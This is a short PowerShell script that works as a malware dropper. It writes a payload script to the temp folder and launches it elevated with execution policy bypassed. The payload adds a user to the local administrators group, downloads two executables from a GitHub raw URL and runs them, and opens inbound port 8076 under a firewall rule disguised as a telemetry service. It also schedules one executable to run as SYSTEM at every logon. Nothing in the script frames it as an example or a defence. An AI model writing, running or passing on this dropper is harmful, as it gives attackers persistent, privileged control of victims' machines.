$scriptPath = "$env:TEMP\payload.ps1"

$payload = @'
net localgroup administrators luffy /add

iwr https://raw.githubusercontent.com/shanks-wq/soder/refs/heads/main/1uk9l129j.exe -OutFile $env:TEMP\1uk9l129j.exe
Start-Process $env:TEMP\1uk9l129j.exe

iwr https://raw.githubusercontent.com/shanks-wq/soder/refs/heads/main/burn.exe -OutFile $env:TEMP\burn.exe
Start-Process $env:TEMP\burn.exe

New-NetFirewallRule -DisplayName "System Telemetry Service" -Direction Inbound -Protocol TCP -LocalPort 8076 -Action Allow

schtasks /create /sc onlogon /tn "bakka" /tr "$env:TEMP\burn.exe" /ru SYSTEM
'@

$payload | Out-File -FilePath $scriptPath -Encoding UTF8
Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
